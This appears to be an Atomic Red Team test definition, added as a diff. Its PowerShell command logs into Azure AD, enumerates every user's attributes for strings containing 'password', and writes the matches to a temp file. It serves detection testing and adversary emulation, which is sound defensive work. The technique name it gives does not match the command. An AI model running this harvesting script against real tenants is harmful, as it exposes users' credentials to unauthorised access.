@@ -1,0 +1,43 @@
+{
+    "name": "Azure - Search Azure AD User Attributes for Passwords",
+    "description": "This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials.  Upon successful execution, this test will scan all user attributes for any strings containing password. Those unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found.  See: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md ",
+    "supported_platforms": [
+        "azure-ad"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "import-module msonline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\n$users = Get-MsolUser -All;\nforeach($user in $users)\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \nforeach($prop in $props)\n{if($user.$prop -like \"*password*\")\n{(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}\nget-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue\n",
+        "cleanup_command": "remove-item $env:temp\\T1552.005Test1.txt -force -erroraction silentlycontinue\n",
+        "name": "powershell",
+        "elevation_required": true,
+        "type": "Command Executor"
+    },
+    "id": "T1552.005",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Cloud Instance Metadata API",
+    "source": "ART",
+    "uuid": "ae9b2e3e-efa1-4483-86e2-fae529ab9fb6",
+    "arguments": {
+        "username": {
+            "description": "Azure AD username",
+            "type": "string",
+            "default": null
+        },
+        "password": {
+            "description": "Azure AD password",
+            "type": "string",
+            "default": "T1082Az"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "The MSOnline module must be installed.\n",
+            "prereq_command": "if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}\n",
+            "get_prereq_command": "install-module MSOnline\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
